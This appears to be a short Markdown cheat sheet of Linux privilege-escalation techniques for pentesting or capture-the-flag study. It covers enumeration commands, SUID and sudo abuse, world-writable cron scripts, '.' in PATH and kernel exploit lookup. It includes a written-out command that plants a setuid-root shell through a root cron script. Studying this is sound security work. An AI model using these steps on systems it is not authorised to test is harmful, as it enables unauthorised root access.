# Privilege Escalation

## Enumeration Summary
`$ netstat -antup`
`$ ps -aux | grep root`
`$ find / -perm -u=s -type f 2>/dev/null`
`$ sudo -l`
`$ ls -la /etc/cron.d`
`$ echo $PATH`
`$ uname -a`


## Root Services Exploit
Certain services are run as root when they shouldn't be. These can be either database or mail/web servers.

### Enumeration
`$ netstat -antup` to find list of open ports
`$ ps -aux | grep root` to find list of processes running as root


## SUID executable
`setuid` is a flag that allows users to run an executable with the permission of the file owner. If the file owner is root,
then the executable can be used to achieve root. Useful when executables is file editor/compiler/interpreter

### Enumeration
`$ find / -perm -u=s -type f 2>/dev/null` to find list of executables with suid bit set


## Sudo rights
Allowing certain executables as root. For example, `find` can be used to search for logs, but also start a shell

### Enumeration
`$ sudo -l` list commands user can run in sudo


## Root cron jobs
The goal is to find cron jobs that execute world-writable scripts. 
We can then create a shell-spawn executable, and elevate its privileges in said script.

### Enumeration
`$ ls -la /etc/cron.d` lists cron jobs
`$ find / -perm -2 -type f 2>/dev/null` finds world-writable files. We want to find scripts called from cron jobs

### Exploit
`$ echo "chown root:root /tmp/rootme; chmod u+s /tmp/rootme;" >/usr/local/sbin/cron-logrotate.sh`


## . in path
Root users might add `.` to their path to save typing `./`

### Enumeration
`$ echo ${PATH}`

### Exploit
Create an executable that contains a shell-spawning script, and wrap it around a common tool.
Then, trick root user to use said tool


## Kernel Exploit Attack
We need:
- A vulnerable kernel
- A matching exploit
- Ability to transfer exploit onto the target
- Ability to execute exploit onto the target

### Enumeration
`uname -a` gets kernel version

### Exploit
`$ searchsploit Linux Kernel 2.6.24` searches for exploits of that version
